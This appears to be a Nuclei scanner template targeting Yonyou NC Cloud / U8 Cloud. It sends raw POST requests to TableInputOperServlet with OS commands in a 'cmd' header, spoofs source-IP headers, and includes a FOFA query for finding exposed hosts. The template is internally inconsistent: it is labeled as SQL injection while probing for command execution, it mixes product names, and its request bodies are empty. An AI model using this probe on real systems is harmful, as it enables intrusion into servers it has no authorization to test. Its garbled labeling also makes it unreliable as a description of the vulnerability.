id: yonyou-nc-TableInputOperServlet-rce
info:
  name: 用友NCCloud系统runScript存在SQL注入漏洞
  author: k3ppf0r
  severity: high
  description: |  
    用友NC Cloud runScript 接口存在SQL注入漏洞，攻击者利用此漏洞可以获取数据库敏感数据。
  reference:
    - https://cn-sec.com/archives/2611041.html
    - https://blog.csdn.net/2301_80733390/article/details/136891472
  remediation: |
    打对应补丁，重启服务
  classification:
    cve-id: TVE-2024-105100017
    cvss-score: 7.1
    cwe-id: CWE-89
  metadata:
    date: 2023-12-14
    version: | 
      用友U8 cloud 2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,5.0
    fofa-query: app="用友-U8-Cloud"
  tags: yonyou,sqli,ncc,u8
http:
  - raw:
      - |-
        POST /service/~iufo/com.ufsoft.iuforeport.tableinput.TableInputOperServlet HTTP/1.1
        Host: {{Hostname}}
        cmd: set /A 896580342+935792469
        X-Forwarded-For: 127.0.0.10
        X-Originating-IP: 127.0.0.10
        X-Remote-Addr: 127.0.0.10
        X-Remote-IP: 127.0.0.10

        {{base64_decode("")}}
      - |-
        POST /service/~iufo/com.ufsoft.iuforeport.tableinput.TableInputOperServlet HTTP/1.1
        Host: {{Hostname}}
        cmd: echo whoisceshi
        X-Forwarded-For: 127.0.0.10
        X-Originating-IP: 127.0.0.10
        X-Remote-Addr: 127.0.0.10
        X-Remote-IP: 127.0.0.10

        {{base64_decode("")}}
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - '1832372811'
      - type: word
        part: body
        words:
          - 'whoisceshi'
